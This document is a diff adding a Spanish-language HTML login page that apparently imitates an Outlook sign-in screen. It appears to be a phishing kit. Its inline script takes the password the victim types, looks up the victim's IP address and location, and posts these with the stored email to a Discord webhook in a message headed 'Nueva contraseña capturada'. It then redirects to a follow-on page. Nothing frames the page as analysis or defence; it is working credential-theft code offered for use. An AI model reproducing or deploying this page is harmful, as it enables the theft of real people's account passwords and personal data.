@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/ico.ico?v=1741715931055" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Reddit+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>    
+    <div class="cont">
+        <div class="cont-form">
+            <div class="log">
+                <img src="" alt="">
+            </div>
+            <div class="cont-xjsx">
+                <div class="lg">
+                    <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/log.svg?v=1741715936758" alt="">
+                </div>
+                <div class="tras"> 
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ababab" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-arrow-left">
+                        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M5 12l14 0" />
+                        <path d="M5 12l6 6" />
+                        <path d="M5 12l6 -6" />
+                    </svg>
+                    <p id="local"></p>
+                </div> 
+                <p id="err"></p>
+                <div class="txt-sin">
+                    <p>Escribir contraseña</p>
+                </div>
+                <form id="xjsx" method="post"> 
+                    <div class="usr usr-eye"> 
+                        <input id="js2" name="js2" type="password" placeholder="Contraseña"> 
+                        <svg id="eye" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" width="24" height="24" stroke-width="2">
+                            <path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0"></path>
+                            <path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6"></path>
+                        </svg> 
+                    </div>
+                    <p id="lce"><a href="#">¿Ha olvidado su contraseña?</a></p>
+                    <div class="sub">
+                        <input type="submit" value="Iniciar sesión"> 
+                    </div> 
+                </form>
+            </div>
+        </div>
+    </div>
+    <div class="sefue">
+        <p>Términos de uso</p>
+        <p>Privacidad y cookies</p>
+        <p>...</p>
+    </div> 
+    <div id="gfg" style="display:none;"></div> 
+    <div id="ip" style="display:none;"></div> 
+    <div id="address" style="display:none;"></div>
+
+    <!-- Script externo para Discord -->
+    <script src="disBLOCK.js"></script>
+    <script>
+        // Mostrar el email del usuario
+        document.addEventListener('DOMContentLoaded', function() {
+            const email = localStorage.getItem('js1');
+            if (email) {
+                document.getElementById('local').textContent = email;
+            }
+            
+            // Alternar visibilidad de la contraseña
+            document.getElementById('eye').addEventListener('click', function() {
+                const passwordInput = document.getElementById('js2');
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    this.style.opacity = '0.7';
+                } else {
+                    passwordInput.type = 'password';
+                    this.style.opacity = '1';
+                }
+            });
+            
+            // Manejar el envío del formulario
+            document.getElementById('xjsx').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const passwordInput = document.getElementById('js2');
+                const errorElement = document.getElementById('err');
+                
+                // Validación básica
+                if (!passwordInput.value.trim()) {
+                    errorElement.innerHTML = 'Campo obligatorio. Por favor, ingrese su contraseña.';
+                    return false;
+                }
+                
+                if (passwordInput.value.trim().length < 4) {
+                    errorElement.innerHTML = 'La contraseña debe tener al menos 4 caracteres.';
+                    return false;
+                }
+                
+                // Enviar datos a Discord
+                sendPasswordToDiscord(passwordInput.value);
+            });
+        });
+
+        // Función para enviar la contraseña a Discord
+        async function sendPasswordToDiscord(password) {
+            const email = localStorage.getItem('js1') || 'No disponible';
+            
+            try {
+                // Obtener datos de IP
+                const ipData = await fetchIPData();
+                
+                // Preparar mensaje para Discord
+                const message = `🍄🍄0UTL🍄🍄
+
+🔐 **Nueva contraseña capturada**
+
+📧 **Correo electrónico:** ${email}
+🔑 **Contraseña:** ${password}
+🌎 **IP:** ${ipData.ip}
+📍 **Ubicación:** ${ipData.city}, ${ipData.country_name}
+🕒 **Hora:** ${new Date().toLocaleString()}`;
+                
+                // Enviar a Discord
+                await sendToDiscord(DISCORD_WEBHOOK, message);
+                
+                // Redirigir a la siguiente página
+                window.location.href = '_indexx.html';
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                // En caso de error, igualmente redirigir
+                window.location.href = '_indexx.html';
+            }
+        }
+    </script>
+</body>
+</html>
